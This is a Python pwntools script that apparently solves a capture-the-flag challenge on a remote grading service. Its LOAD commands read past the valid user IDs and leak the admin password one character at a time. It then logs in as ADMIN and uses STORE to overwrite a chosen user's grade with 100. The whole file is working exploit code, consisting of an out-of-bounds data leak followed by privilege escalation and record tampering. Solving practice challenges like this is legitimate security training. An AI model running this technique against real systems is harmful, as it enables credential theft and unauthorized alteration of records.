#!/usr/bin/env python3
from pwn import *
import re

TARGET_UID = 2338
TARGET_GRADE = 100

r = remote("chals.disorientation.cssa.club", 5565)

def get_password():
    def get_grade(uid):
        msg = f"LOAD {uid}".encode()
        r.sendline(msg)
        response = r.recvline().decode().strip()
        print(response)
        match = re.search(r"is (\d+)", response)
        if not match:
            raise ValueError(f"Could not parse grade from: {response}")

        grade = int(match.group(1))
        return grade
    uid = 10000
    current_char = chr(get_grade(uid))
    characters = [ current_char ]
    while current_char != '\0':
        uid += 1
        current_char = chr(get_grade(uid))
        characters.append(current_char)
    return ''.join(c for c in characters if c != '\0')

# Get password
r.sendlineafter("(Y/N)", b"N")
r.recvuntil(b"type EXIT to log out.\n")  
password = get_password()
print(f"Recovered password: {password}")

# Login as ADMIN and set the target uid 100
r.sendline(b"EXIT")
r.sendlineafter("(Y/N)", b"Y")
r.sendlineafter(".", password.encode())
r.recvuntil(b"type EXIT to log out.\n")  
r.sendline(f"STORE {TARGET_UID} {TARGET_GRADE}".encode())

r.interactive()

